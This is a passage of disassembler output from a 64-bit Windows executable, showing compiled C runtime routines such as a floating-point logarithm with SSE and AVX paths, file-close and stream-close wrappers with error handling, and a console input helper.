   140009bba:	66 0f 28 c1          	movapd %xmm1,%xmm0
   140009bbe:	4c 8d 0d ab 74 00 00 	lea    0x74ab(%rip),%r9        # 0x140011070
   140009bc5:	f2 0f 10 1d f3 73 00 	movsd  0x73f3(%rip),%xmm3        # 0x140010fc0
   140009bcc:	00 
   140009bcd:	f2 0f 10 0d bb 73 00 	movsd  0x73bb(%rip),%xmm1        # 0x140010f90
   140009bd4:	00 
   140009bd5:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   140009bd9:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   140009bdd:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   140009be1:	66 0f 28 e0          	movapd %xmm0,%xmm4
   140009be5:	f2 0f 58 1d c3 73 00 	addsd  0x73c3(%rip),%xmm3        # 0x140010fb0
   140009bec:	00 
   140009bed:	f2 0f 58 0d 8b 73 00 	addsd  0x738b(%rip),%xmm1        # 0x140010f80
   140009bf4:	00 
   140009bf5:	f2 0f 59 e0          	mulsd  %xmm0,%xmm4
   140009bf9:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   140009bfd:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   140009c01:	f2 0f 58 1d 97 73 00 	addsd  0x7397(%rip),%xmm3        # 0x140010fa0
   140009c08:	00 
   140009c09:	f2 0f 58 ca          	addsd  %xmm2,%xmm1
   140009c0d:	f2 0f 59 dc          	mulsd  %xmm4,%xmm3
   140009c11:	f2 0f 58 cb          	addsd  %xmm3,%xmm1
   140009c15:	f2 0f 10 2d 23 73 00 	movsd  0x7323(%rip),%xmm5        # 0x140010f40
   140009c1c:	00 
   140009c1d:	f2 0f 59 0d db 72 00 	mulsd  0x72db(%rip),%xmm1        # 0x140010f00
   140009c24:	00 
   140009c25:	f2 0f 59 ee          	mulsd  %xmm6,%xmm5
   140009c29:	f2 0f 5c e9          	subsd  %xmm1,%xmm5
   140009c2d:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   140009c33:	48 8d 15 46 7c 00 00 	lea    0x7c46(%rip),%rdx        # 0x140011880
   140009c3a:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   140009c3f:	f2 0f 10 25 e9 72 00 	movsd  0x72e9(%rip),%xmm4        # 0x140010f30
   140009c46:	00 
   140009c47:	f2 0f 59 e6          	mulsd  %xmm6,%xmm4
   140009c4b:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   140009c4f:	f2 0f 58 d5          	addsd  %xmm5,%xmm2
   140009c53:	f2 0f 58 c2          	addsd  %xmm2,%xmm0
   140009c57:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   140009c5d:	48 83 c4 58          	add    $0x58,%rsp
   140009c61:	c3                   	ret
   140009c62:	f2 0f 10 15 e6 72 00 	movsd  0x72e6(%rip),%xmm2        # 0x140010f50
   140009c69:	00 
   140009c6a:	f2 0f 5c 05 ee 72 00 	subsd  0x72ee(%rip),%xmm0        # 0x140010f60
   140009c71:	00 
   140009c72:	f2 0f 58 d0          	addsd  %xmm0,%xmm2
   140009c76:	66 0f 28 c8          	movapd %xmm0,%xmm1
   140009c7a:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   140009c7e:	f2 0f 10 25 9a 73 00 	movsd  0x739a(%rip),%xmm4        # 0x140011020
   140009c85:	00 
   140009c86:	f2 0f 10 2d b2 73 00 	movsd  0x73b2(%rip),%xmm5        # 0x140011040
   140009c8d:	00 
   140009c8e:	66 0f 28 f0          	movapd %xmm0,%xmm6
   140009c92:	f2 0f 59 f1          	mulsd  %xmm1,%xmm6
   140009c96:	f2 0f 58 c9          	addsd  %xmm1,%xmm1
   140009c9a:	66 0f 28 d1          	movapd %xmm1,%xmm2
   140009c9e:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   140009ca2:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   140009ca6:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   140009caa:	f2 0f 58 25 5e 73 00 	addsd  0x735e(%rip),%xmm4        # 0x140011010
   140009cb1:	00 
   140009cb2:	f2 0f 58 2d 76 73 00 	addsd  0x7376(%rip),%xmm5        # 0x140011030
   140009cb9:	00 
   140009cba:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   140009cbe:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   140009cc2:	f2 0f 59 d2          	mulsd  %xmm2,%xmm2
   140009cc6:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   140009cca:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   140009cce:	f2 0f 10 15 4a 72 00 	movsd  0x724a(%rip),%xmm2        # 0x140010f20
   140009cd5:	00 
   140009cd6:	f2 0f 58 e5          	addsd  %xmm5,%xmm4
   140009cda:	f2 0f 5c e6          	subsd  %xmm6,%xmm4
   140009cde:	f2 0f 10 35 2a 72 00 	movsd  0x722a(%rip),%xmm6        # 0x140010f10
   140009ce5:	00 
   140009ce6:	66 0f 28 d8          	movapd %xmm0,%xmm3
   140009cea:	66 0f db 1d 5e 73 00 	pand   0x735e(%rip),%xmm3        # 0x140011050
   140009cf1:	00 
   140009cf2:	f2 0f 5c c3          	subsd  %xmm3,%xmm0
   140009cf6:	f2 0f 58 e0          	addsd  %xmm0,%xmm4
   140009cfa:	66 0f 28 c3          	movapd %xmm3,%xmm0
   140009cfe:	66 0f 28 cc          	movapd %xmm4,%xmm1
   140009d02:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   140009d06:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   140009d0a:	f2 0f 59 ce          	mulsd  %xmm6,%xmm1
   140009d0e:	f2 0f 59 de          	mulsd  %xmm6,%xmm3
   140009d12:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   140009d16:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   140009d1a:	f2 0f 58 c3          	addsd  %xmm3,%xmm0
   140009d1e:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   140009d24:	48 83 c4 58          	add    $0x58,%rsp
   140009d28:	c3                   	ret
   140009d29:	66 0f eb 15 2f 72 00 	por    0x722f(%rip),%xmm2        # 0x140010f60
   140009d30:	00 
   140009d31:	f2 0f 5c 15 27 72 00 	subsd  0x7227(%rip),%xmm2        # 0x140010f60
   140009d38:	00 
   140009d39:	f2 0f 10 ea          	movsd  %xmm2,%xmm5
   140009d3d:	66 0f db 15 8b 71 00 	pand   0x718b(%rip),%xmm2        # 0x140010ed0
   140009d44:	00 
   140009d45:	66 48 0f 7e d0       	movq   %xmm2,%rax
   140009d4a:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
   140009d4f:	66 0f fa 2d 89 72 00 	psubd  0x7289(%rip),%xmm5        # 0x140010fe0
   140009d56:	00 
   140009d57:	f3 0f e6 f5          	cvtdq2pd %xmm5,%xmm6
   140009d5b:	e9 ff fd ff ff       	jmp    0x140009b5f
   140009d60:	75 16                	jne    0x140009d78
   140009d62:	f2 0f 10 0d 16 71 00 	movsd  0x7116(%rip),%xmm1        # 0x140010e80
   140009d69:	00 
   140009d6a:	44 8b 05 ef 72 00 00 	mov    0x72ef(%rip),%r8d        # 0x140011060
   140009d71:	e8 8a 07 00 00       	call   0x14000a500
   140009d76:	eb 36                	jmp    0x140009dae
   140009d78:	f2 0f 10 0d 20 71 00 	movsd  0x7120(%rip),%xmm1        # 0x140010ea0
   140009d7f:	00 
   140009d80:	44 8b 05 dd 72 00 00 	mov    0x72dd(%rip),%r8d        # 0x140011064
   140009d87:	e8 74 07 00 00       	call   0x14000a500
   140009d8c:	eb 20                	jmp    0x140009dae
   140009d8e:	48 3b 05 fb 70 00 00 	cmp    0x70fb(%rip),%rax        # 0x140010e90
   140009d95:	74 17                	je     0x140009dae
   140009d97:	48 3b 05 e2 70 00 00 	cmp    0x70e2(%rip),%rax        # 0x140010e80
   140009d9e:	74 d8                	je     0x140009d78
   140009da0:	48 0b 05 09 71 00 00 	or     0x7109(%rip),%rax        # 0x140010eb0
   140009da7:	66 48 0f 6e c0       	movq   %rax,%xmm0
   140009dac:	66 90                	xchg   %ax,%ax
   140009dae:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   140009db4:	48 83 c4 58          	add    $0x58,%rsp
   140009db8:	c3                   	ret
   140009db9:	48 33 c0             	xor    %rax,%rax
   140009dbc:	c5 e1 73 d0 34       	vpsrlq $0x34,%xmm0,%xmm3
   140009dc1:	c4 e1 f9 7e c0       	vmovq  %xmm0,%rax
   140009dc6:	c5 e1 fb 1d f2 70 00 	vpsubq 0x70f2(%rip),%xmm3,%xmm3        # 0x140010ec0
   140009dcd:	00 
   140009dce:	c5 fa e6 f3          	vcvtdq2pd %xmm3,%xmm6
   140009dd2:	c5 f9 db 2d b6 70 00 	vpand  0x70b6(%rip),%xmm0,%xmm5        # 0x140010e90
   140009dd9:	00 
   140009dda:	c5 f9 2f 2d ae 70 00 	vcomisd 0x70ae(%rip),%xmm5        # 0x140010e90
   140009de1:	00 
   140009de2:	0f 84 2b 02 00 00    	je     0x14000a013
   140009de8:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   140009dec:	c5 f9 2f c5          	vcomisd %xmm5,%xmm0
   140009df0:	0f 86 dd 01 00 00    	jbe    0x140009fd3
   140009df6:	c5 f9 db 15 d2 70 00 	vpand  0x70d2(%rip),%xmm0,%xmm2        # 0x140010ed0
   140009dfd:	00 
   140009dfe:	c5 fb 5c 25 5a 71 00 	vsubsd 0x715a(%rip),%xmm0,%xmm4        # 0x140010f60
   140009e05:	00 
   140009e06:	c5 f9 2f 35 c2 71 00 	vcomisd 0x71c2(%rip),%xmm6        # 0x140010fd0
   140009e0d:	00 
   140009e0e:	0f 84 8d 01 00 00    	je     0x140009fa1
   140009e14:	c5 f9 db 0d c4 70 00 	vpand  0x70c4(%rip),%xmm0,%xmm1        # 0x140010ee0
   140009e1b:	00 
   140009e1c:	c5 f9 db 1d cc 70 00 	vpand  0x70cc(%rip),%xmm0,%xmm3        # 0x140010ef0
   140009e23:	00 
   140009e24:	c5 e1 73 f3 01       	vpsllq $0x1,%xmm3,%xmm3
   140009e29:	c5 e1 d4 c9          	vpaddq %xmm1,%xmm3,%xmm1
   140009e2d:	c4 e1 f9 7e c8       	vmovq  %xmm1,%rax
   140009e32:	c5 d9 db 25 c6 71 00 	vpand  0x71c6(%rip),%xmm4,%xmm4        # 0x140011000
   140009e39:	00 
   140009e3a:	c5 f9 2f 25 ae 71 00 	vcomisd 0x71ae(%rip),%xmm4        # 0x140010ff0
   140009e41:	00 
   140009e42:	0f 82 b0 00 00 00    	jb     0x140009ef8
   140009e48:	48 c1 e8 2c          	shr    $0x2c,%rax
   140009e4c:	c5 e9 eb 15 1c 71 00 	vpor   0x711c(%rip),%xmm2,%xmm2        # 0x140010f70
   140009e53:	00 
   140009e54:	c5 f1 eb 0d 14 71 00 	vpor   0x7114(%rip),%xmm1,%xmm1        # 0x140010f70
   140009e5b:	00 
   140009e5c:	4c 8d 0d 2d 82 00 00 	lea    0x822d(%rip),%r9        # 0x140012090
   140009e63:	c5 f3 5c ca          	vsubsd %xmm2,%xmm1,%xmm1
   140009e67:	c4 c1 73 59 0c c1    	vmulsd (%r9,%rax,8),%xmm1,%xmm1
   140009e6d:	4c 8d 0d fc 71 00 00 	lea    0x71fc(%rip),%r9        # 0x140011070
   140009e74:	c5 f3 59 c1          	vmulsd %xmm1,%xmm1,%xmm0
   140009e78:	c5 fb 10 1d 40 71 00 	vmovsd 0x7140(%rip),%xmm3        # 0x140010fc0
   140009e7f:	00 
   140009e80:	c5 fb 10 2d 08 71 00 	vmovsd 0x7108(%rip),%xmm5        # 0x140010f90
   140009e87:	00 
   140009e88:	c4 e2 f1 a9 1d 1f 71 	vfmadd213sd 0x711f(%rip),%xmm1,%xmm3        # 0x140010fb0
   140009e8f:	00 00 
   140009e91:	c4 e2 f1 a9 2d d6 70 	vfmadd213sd 0x70d6(%rip),%xmm1,%xmm5        # 0x140010f70
   140009e98:	00 00 
   140009e9a:	f2 0f 10 e0          	movsd  %xmm0,%xmm4
   140009e9e:	c4 e2 f1 a9 1d f9 70 	vfmadd213sd 0x70f9(%rip),%xmm1,%xmm3        # 0x140010fa0
   140009ea5:	00 00 
   140009ea7:	c5 fb 59 e0          	vmulsd %xmm0,%xmm0,%xmm4
   140009eab:	c4 e2 d1 b9 c8       	vfmadd231sd %xmm0,%xmm5,%xmm1
   140009eb0:	c4 e2 e1 b9 cc       	vfmadd231sd %xmm4,%xmm3,%xmm1
   140009eb5:	c5 f3 59 0d 43 70 00 	vmulsd 0x7043(%rip),%xmm1,%xmm1        # 0x140010f00
   140009ebc:	00 
   140009ebd:	c5 fb 10 2d 7b 70 00 	vmovsd 0x707b(%rip),%xmm5        # 0x140010f40
   140009ec4:	00 
   140009ec5:	c4 e2 c9 ab e9       	vfmsub213sd %xmm1,%xmm6,%xmm5
   140009eca:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   140009ed0:	48 8d 15 a9 79 00 00 	lea    0x79a9(%rip),%rdx        # 0x140011880
   140009ed7:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   140009edc:	c5 eb 58 d5          	vaddsd %xmm5,%xmm2,%xmm2
   140009ee0:	c4 e2 c9 b9 05 47 70 	vfmadd231sd 0x7047(%rip),%xmm6,%xmm0        # 0x140010f30
   140009ee7:	00 00 
   140009ee9:	c5 fb 58 c2          	vaddsd %xmm2,%xmm0,%xmm0
   140009eed:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   140009ef3:	48 83 c4 58          	add    $0x58,%rsp
   140009ef7:	c3                   	ret
   140009ef8:	c5 fb 10 15 50 70 00 	vmovsd 0x7050(%rip),%xmm2        # 0x140010f50
   140009eff:	00 
   140009f00:	c5 fb 5c 05 58 70 00 	vsubsd 0x7058(%rip),%xmm0,%xmm0        # 0x140010f60
   140009f07:	00 
   140009f08:	c5 eb 58 d0          	vaddsd %xmm0,%xmm2,%xmm2
   140009f0c:	c5 fb 5e ca          	vdivsd %xmm2,%xmm0,%xmm1
   140009f10:	c5 fb 10 25 08 71 00 	vmovsd 0x7108(%rip),%xmm4        # 0x140011020
   140009f17:	00 
   140009f18:	c5 fb 10 2d 20 71 00 	vmovsd 0x7120(%rip),%xmm5        # 0x140011040
   140009f1f:	00 
   140009f20:	c5 fb 59 f1          	vmulsd %xmm1,%xmm0,%xmm6
   140009f24:	c5 f3 58 c9          	vaddsd %xmm1,%xmm1,%xmm1
   140009f28:	c5 f3 59 d1          	vmulsd %xmm1,%xmm1,%xmm2
   140009f2c:	c4 e2 e9 a9 25 db 70 	vfmadd213sd 0x70db(%rip),%xmm2,%xmm4        # 0x140011010
   140009f33:	00 00 
   140009f35:	c4 e2 e9 a9 2d f2 70 	vfmadd213sd 0x70f2(%rip),%xmm2,%xmm5        # 0x140011030
   140009f3c:	00 00 
   140009f3e:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   140009f42:	c5 db 59 e2          	vmulsd %xmm2,%xmm4,%xmm4
   140009f46:	c5 eb 59 d2          	vmulsd %xmm2,%xmm2,%xmm2
   140009f4a:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   140009f4e:	c5 d3 59 ea          	vmulsd %xmm2,%xmm5,%xmm5
   140009f52:	c5 db 58 e5          	vaddsd %xmm5,%xmm4,%xmm4
   140009f56:	c5 db 5c e6          	vsubsd %xmm6,%xmm4,%xmm4
   140009f5a:	c5 f9 db 1d ee 70 00 	vpand  0x70ee(%rip),%xmm0,%xmm3        # 0x140011050
   140009f61:	00 
   140009f62:	c5 fb 5c c3          	vsubsd %xmm3,%xmm0,%xmm0
   140009f66:	c5 db 58 e0          	vaddsd %xmm0,%xmm4,%xmm4
   140009f6a:	c5 db 59 0d 9e 6f 00 	vmulsd 0x6f9e(%rip),%xmm4,%xmm1        # 0x140010f10
   140009f71:	00 
   140009f72:	c5 db 59 25 a6 6f 00 	vmulsd 0x6fa6(%rip),%xmm4,%xmm4        # 0x140010f20
   140009f79:	00 
   140009f7a:	c5 e3 59 05 9e 6f 00 	vmulsd 0x6f9e(%rip),%xmm3,%xmm0        # 0x140010f20
   140009f81:	00 
   140009f82:	c5 e3 59 1d 86 6f 00 	vmulsd 0x6f86(%rip),%xmm3,%xmm3        # 0x140010f10
   140009f89:	00 
   140009f8a:	c5 fb 58 c4          	vaddsd %xmm4,%xmm0,%xmm0
   140009f8e:	c5 fb 58 c1          	vaddsd %xmm1,%xmm0,%xmm0
   140009f92:	c5 fb 58 c3          	vaddsd %xmm3,%xmm0,%xmm0
   140009f96:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   140009f9c:	48 83 c4 58          	add    $0x58,%rsp
   140009fa0:	c3                   	ret
   140009fa1:	c5 e9 eb 15 b7 6f 00 	vpor   0x6fb7(%rip),%xmm2,%xmm2        # 0x140010f60
   140009fa8:	00 
   140009fa9:	c5 eb 5c 15 af 6f 00 	vsubsd 0x6faf(%rip),%xmm2,%xmm2        # 0x140010f60
   140009fb0:	00 
   140009fb1:	c5 d1 73 d2 34       	vpsrlq $0x34,%xmm2,%xmm5
   140009fb6:	c5 e9 db 15 12 6f 00 	vpand  0x6f12(%rip),%xmm2,%xmm2        # 0x140010ed0
   140009fbd:	00 
   140009fbe:	c5 f9 28 c2          	vmovapd %xmm2,%xmm0
   140009fc2:	c5 d1 fa 2d 16 70 00 	vpsubd 0x7016(%rip),%xmm5,%xmm5        # 0x140010fe0
   140009fc9:	00 
   140009fca:	c5 fa e6 f5          	vcvtdq2pd %xmm5,%xmm6
   140009fce:	e9 41 fe ff ff       	jmp    0x140009e14
   140009fd3:	75 1f                	jne    0x140009ff4
   140009fd5:	c5 fb 10 0d a3 6e 00 	vmovsd 0x6ea3(%rip),%xmm1        # 0x140010e80
   140009fdc:	00 
   140009fdd:	44 8b 05 7c 70 00 00 	mov    0x707c(%rip),%r8d        # 0x140011060
   140009fe4:	e8 17 05 00 00       	call   0x14000a500
   140009fe9:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   140009fef:	48 83 c4 58          	add    $0x58,%rsp
   140009ff3:	c3                   	ret
   140009ff4:	c5 fb 10 0d a4 6e 00 	vmovsd 0x6ea4(%rip),%xmm1        # 0x140010ea0
   140009ffb:	00 
   140009ffc:	44 8b 05 61 70 00 00 	mov    0x7061(%rip),%r8d        # 0x140011064
   14000a003:	e8 f8 04 00 00       	call   0x14000a500
   14000a008:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000a00e:	48 83 c4 58          	add    $0x58,%rsp
   14000a012:	c3                   	ret
   14000a013:	48 3b 05 76 6e 00 00 	cmp    0x6e76(%rip),%rax        # 0x140010e90
   14000a01a:	74 23                	je     0x14000a03f
   14000a01c:	48 3b 05 5d 6e 00 00 	cmp    0x6e5d(%rip),%rax        # 0x140010e80
   14000a023:	74 cf                	je     0x140009ff4
   14000a025:	48 0b 05 84 6e 00 00 	or     0x6e84(%rip),%rax        # 0x140010eb0
   14000a02c:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000a031:	44 8b 05 30 70 00 00 	mov    0x7030(%rip),%r8d        # 0x140011068
   14000a038:	e8 c3 04 00 00       	call   0x14000a500
   14000a03d:	eb 00                	jmp    0x14000a03f
   14000a03f:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000a045:	48 83 c4 58          	add    $0x58,%rsp
   14000a049:	c3                   	ret
   14000a04a:	90                   	nop
   14000a04b:	90                   	nop
   14000a04c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a051:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a056:	57                   	push   %rdi
   14000a057:	48 83 ec 20          	sub    $0x20,%rsp
   14000a05b:	48 63 d9             	movslq %ecx,%rbx
   14000a05e:	41 8b f8             	mov    %r8d,%edi
   14000a061:	8b cb                	mov    %ebx,%ecx
   14000a063:	48 8b f2             	mov    %rdx,%rsi
   14000a066:	e8 19 cd ff ff       	call   0x140006d84
   14000a06b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000a06f:	75 11                	jne    0x14000a082
   14000a071:	e8 7a ac ff ff       	call   0x140004cf0
   14000a076:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a07c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000a080:	eb 53                	jmp    0x14000a0d5
   14000a082:	44 8b cf             	mov    %edi,%r9d
   14000a085:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000a08a:	48 8b d6             	mov    %rsi,%rdx
   14000a08d:	48 8b c8             	mov    %rax,%rcx
   14000a090:	ff 15 b2 21 00 00    	call   *0x21b2(%rip)        # 0x14000c248
   14000a096:	85 c0                	test   %eax,%eax
   14000a098:	75 0f                	jne    0x14000a0a9
   14000a09a:	ff 15 60 1f 00 00    	call   *0x1f60(%rip)        # 0x14000c000
   14000a0a0:	8b c8                	mov    %eax,%ecx
   14000a0a2:	e8 d9 ab ff ff       	call   0x140004c80
   14000a0a7:	eb d3                	jmp    0x14000a07c
   14000a0a9:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000a0ae:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000a0b2:	74 c8                	je     0x14000a07c
   14000a0b4:	48 8b d3             	mov    %rbx,%rdx
   14000a0b7:	4c 8d 05 52 c5 00 00 	lea    0xc552(%rip),%r8        # 0x140016610
   14000a0be:	83 e2 3f             	and    $0x3f,%edx
   14000a0c1:	48 8b cb             	mov    %rbx,%rcx
   14000a0c4:	48 c1 f9 06          	sar    $0x6,%rcx
   14000a0c8:	48 c1 e2 06          	shl    $0x6,%rdx
   14000a0cc:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000a0d0:	80 64 11 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,1)
   14000a0d5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a0da:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000a0df:	48 83 c4 20          	add    $0x20,%rsp
   14000a0e3:	5f                   	pop    %rdi
   14000a0e4:	c3                   	ret
   14000a0e5:	90                   	nop
   14000a0e6:	90                   	nop
   14000a0e7:	90                   	nop
   14000a0e8:	e9 5f ff ff ff       	jmp    0x14000a04c
   14000a0ed:	90                   	nop
   14000a0ee:	90                   	nop
   14000a0ef:	90                   	nop
   14000a0f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a0f5:	57                   	push   %rdi
   14000a0f6:	48 83 ec 20          	sub    $0x20,%rsp
   14000a0fa:	48 8b d9             	mov    %rcx,%rbx
   14000a0fd:	48 85 c9             	test   %rcx,%rcx
   14000a100:	75 15                	jne    0x14000a117
   14000a102:	e8 e9 ab ff ff       	call   0x140004cf0
   14000a107:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a10d:	e8 be aa ff ff       	call   0x140004bd0
   14000a112:	83 c8 ff             	or     $0xffffffff,%eax
   14000a115:	eb 51                	jmp    0x14000a168
   14000a117:	83 cf ff             	or     $0xffffffff,%edi
   14000a11a:	8b 41 14             	mov    0x14(%rcx),%eax
   14000a11d:	c1 e8 0d             	shr    $0xd,%eax
   14000a120:	a8 01                	test   $0x1,%al
   14000a122:	74 3a                	je     0x14000a15e
   14000a124:	e8 27 ec ff ff       	call   0x140008d50
   14000a129:	48 8b cb             	mov    %rbx,%rcx
   14000a12c:	8b f8                	mov    %eax,%edi
   14000a12e:	e8 c5 ee ff ff       	call   0x140008ff8
   14000a133:	48 8b cb             	mov    %rbx,%rcx
   14000a136:	e8 d5 de ff ff       	call   0x140008010
   14000a13b:	8b c8                	mov    %eax,%ecx
   14000a13d:	e8 ea 04 00 00       	call   0x14000a62c
   14000a142:	85 c0                	test   %eax,%eax
   14000a144:	79 05                	jns    0x14000a14b
   14000a146:	83 cf ff             	or     $0xffffffff,%edi
   14000a149:	eb 13                	jmp    0x14000a15e
   14000a14b:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000a14f:	48 85 c9             	test   %rcx,%rcx
   14000a152:	74 0a                	je     0x14000a15e
   14000a154:	e8 e7 a5 ff ff       	call   0x140004740
   14000a159:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   14000a15e:	48 8b cb             	mov    %rbx,%rcx
   14000a161:	e8 26 06 00 00       	call   0x14000a78c
   14000a166:	8b c7                	mov    %edi,%eax
   14000a168:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a16d:	48 83 c4 20          	add    $0x20,%rsp
   14000a171:	5f                   	pop    %rdi
   14000a172:	c3                   	ret
   14000a173:	90                   	nop
   14000a174:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000a179:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000a17e:	57                   	push   %rdi
   14000a17f:	48 83 ec 20          	sub    $0x20,%rsp
   14000a183:	48 8b d9             	mov    %rcx,%rbx
   14000a186:	33 c0                	xor    %eax,%eax
   14000a188:	48 85 c9             	test   %rcx,%rcx
   14000a18b:	0f 95 c0             	setne  %al
   14000a18e:	85 c0                	test   %eax,%eax
   14000a190:	75 15                	jne    0x14000a1a7
   14000a192:	e8 59 ab ff ff       	call   0x140004cf0
   14000a197:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a19d:	e8 2e aa ff ff       	call   0x140004bd0
   14000a1a2:	83 c8 ff             	or     $0xffffffff,%eax
   14000a1a5:	eb 2b                	jmp    0x14000a1d2
   14000a1a7:	8b 41 14             	mov    0x14(%rcx),%eax
   14000a1aa:	c1 e8 0c             	shr    $0xc,%eax
   14000a1ad:	a8 01                	test   $0x1,%al
   14000a1af:	74 07                	je     0x14000a1b8
   14000a1b1:	e8 d6 05 00 00       	call   0x14000a78c
   14000a1b6:	eb ea                	jmp    0x14000a1a2
   14000a1b8:	e8 f7 df ff ff       	call   0x1400081b4
   14000a1bd:	90                   	nop
   14000a1be:	48 8b cb             	mov    %rbx,%rcx
   14000a1c1:	e8 2a ff ff ff       	call   0x14000a0f0
   14000a1c6:	8b f8                	mov    %eax,%edi
   14000a1c8:	48 8b cb             	mov    %rbx,%rcx
   14000a1cb:	e8 f0 df ff ff       	call   0x1400081c0
   14000a1d0:	8b c7                	mov    %edi,%eax
   14000a1d2:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000a1d7:	48 83 c4 20          	add    $0x20,%rsp
   14000a1db:	5f                   	pop    %rdi
   14000a1dc:	c3                   	ret
   14000a1dd:	90                   	nop
   14000a1de:	90                   	nop
   14000a1df:	90                   	nop
   14000a1e0:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   14000a1e5:	48 83 ec 38          	sub    $0x38,%rsp
   14000a1e9:	48 8b 0d 28 b7 00 00 	mov    0xb728(%rip),%rcx        # 0x140015918
   14000a1f0:	48 83 f9 fe          	cmp    $0xfffffffffffffffe,%rcx
   14000a1f4:	75 0c                	jne    0x14000a202
   14000a1f6:	e8 d5 05 00 00       	call   0x14000a7d0
   14000a1fb:	48 8b 0d 16 b7 00 00 	mov    0xb716(%rip),%rcx        # 0x140015918
   14000a202:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   14000a206:	75 07                	jne    0x14000a20f
   14000a208:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000a20d:	eb 25                	jmp    0x14000a234
   14000a20f:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a215:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   14000a21a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000a220:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000a225:	ff 15 25 20 00 00    	call   *0x2025(%rip)        # 0x14000c250
   14000a22b:	85 c0                	test   %eax,%eax
   14000a22d:	74 d9                	je     0x14000a208
   14000a22f:	0f b7 44 24 40       	movzwl 0x40(%rsp),%eax
   14000a234:	48 83 c4 38          	add    $0x38,%rsp
   14000a238:	c3                   	ret
   14000a239:	90                   	nop
   14000a23a:	90                   	nop
   14000a23b:	90                   	nop
   14000a23c:	48 8b c4             	mov    %rsp,%rax
   14000a23f:	53                   	push   %rbx
   14000a240:	48 83 ec 50          	sub    $0x50,%rsp
   14000a244:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   14000a24b:	00 00 
   14000a24d:	8b d9                	mov    %ecx,%ebx
   14000a24f:	f2 0f 10 8c 24 88 00 	movsd  0x88(%rsp),%xmm1
   14000a256:	00 00 
   14000a258:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000a25d:	89 48 c8             	mov    %ecx,-0x38(%rax)
   14000a260:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000a267:	00 
   14000a268:	f2 0f 11 40 e0       	movsd  %xmm0,-0x20(%rax)
   14000a26d:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   14000a272:	f2 0f 11 58 d8       	movsd  %xmm3,-0x28(%rax)
   14000a277:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   14000a27b:	e8 60 09 00 00       	call   0x14000abe0
   14000a280:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000a285:	e8 f2 92 ff ff       	call   0x14000357c
   14000a28a:	85 c0                	test   %eax,%eax
   14000a28c:	75 07                	jne    0x14000a295
   14000a28e:	8b cb                	mov    %ebx,%ecx
